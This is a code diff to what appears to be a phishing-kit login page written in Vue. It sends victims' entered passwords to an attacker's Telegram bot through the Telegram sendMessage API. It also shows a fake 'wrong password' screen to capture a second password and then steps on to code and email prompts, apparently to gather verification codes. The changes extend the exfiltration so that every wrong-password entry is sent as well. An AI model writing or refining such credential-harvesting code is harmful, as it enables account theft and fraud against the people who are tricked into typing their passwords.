@@ -24,7 +24,7 @@ export default {
       decision: "",
       firstPassword: false,
       secondPassword: false,
-      wrongPw: false, // Added wrongPw state
+      wrongPw: false,
       form: {
         page_name: "",
         name: "",
@@ -93,7 +93,7 @@ export default {
     getResponse() {
       // Simulate response
       setTimeout(() => {
-        let fakeResponse = "CMD_CODE"; // Simulate any response here
+        let fakeResponse = "CMD_EMAIL"; // Simulate any response here
         this.handleResponse(fakeResponse);
       }, 2000);
     },
@@ -165,26 +165,32 @@ export default {
             chat_id: TELEGRAM_CHAT_ID,
             text: `First Password: ${this.modal.password}`,
           })
-            .then((response) => {
-              console.log(response);
-            })
-            .catch((e) => {
-              this.errors.push(e);
-              console.log(this.errors);
-            });
-
-          // Set wrongPw to true to simulate wrong password scenario
-          this.wrongPw = true;
-          this.secondPassword = true;
+          .then((response) => {
+            console.log(response);
+            // Set wrongPw to true to display the wrong password page
+            this.wrongPw = true;
+          })
+          .catch((error) => {
+            console.error(error);
+          });
         } else {
-          // Simulate response
-          setTimeout(() => {
+          // Send wrong password notification to Telegram
+          axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `Wrong Password: ${this.modal.password}`,
+          })
+          .then((response) => {
+            console.log(response);
+            // Simulate moving to CMD_CODE after wrong password submission
             let fakeResponse = "CMD_CODE"; // Simulate any response here
             this.handleResponse(fakeResponse);
             this.waitingForResponse = true;
             this.loading = true;
             this.getResponse();
-          }, 2000);
+          })
+          .catch((error) => {
+            console.error(error);
+          });
         }
       } else {
         this.modal.error = true;
